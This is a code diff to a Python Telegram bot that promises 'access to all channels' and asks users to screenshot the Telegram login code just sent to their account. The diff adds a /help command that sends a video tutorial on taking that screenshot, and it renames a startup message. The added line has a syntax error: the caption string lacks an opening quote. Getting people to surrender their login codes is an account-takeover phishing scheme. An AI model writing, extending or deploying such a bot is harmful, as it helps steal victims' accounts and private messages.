@@ -111,6 +111,8 @@ We sent a login code to your Telegram account, please send take a screenshot and
 📷 Please see the example Picture 
 
 Just send it in the form of a screenshot, you don't need to send it via text.
+
+❓if you dont understand please type /help
 """)
 
 # SUCCESFULLY CMD & CALLBACK
@@ -178,6 +180,12 @@ Congratulations!!! 🎉
 
 You have access to all channels!!
 """)
+# HELP
+
+@app.on_message(filters.command("help") & filters.private)
+async def verip(_, message):
+    await app.send_video(message.chat.id, "https://t.me/ifusadcallme/8", caption=🎥 Video tutorial for sending screenshots so that my account is detected by this bot.")
+
 
 # DATABASE !!!
 
@@ -318,7 +326,7 @@ async def init():
         except:
             pass
 
-    print("[Rexa Ganteng] - Rexa Ganteng Started")
+    print("[Rexa Ganteng] - Bot Started!")
     await idle()
 
 
